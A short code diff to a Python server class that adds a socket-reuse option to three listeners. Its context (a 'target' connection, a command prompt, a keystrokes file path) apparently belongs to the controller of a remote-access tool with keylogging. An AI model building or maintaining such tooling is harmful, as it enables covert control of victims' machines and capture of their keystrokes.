@@ -31,6 +31,7 @@ class Server:
              print(f"[*]Listening on {self.ip}:{self.port}")
           prompt = ">".rstrip("\n")
           with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as sock:
+               sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sock.bind((self.ip,self.port))
                sock.listen(2)
                tgt_sock, addr = sock.accept()
@@ -80,6 +81,7 @@ class Server:
            print(f"[*]Keystrokes file path -> {colored(path,'green')}")
            
         with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as ksock:
+             ksock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
              ksock.bind((self.ip,self.port))
              ksock.listen(2)
              tgt_ksock, addr = ksock.accept()
@@ -112,6 +114,7 @@ class Server:
         
         while True:
            with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s_sock:
+                 s_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                  s_sock.bind((self.ip,self.port))
                  s_sock.listen(2)
                  tgt_s_sock, addr = s_sock.accept()
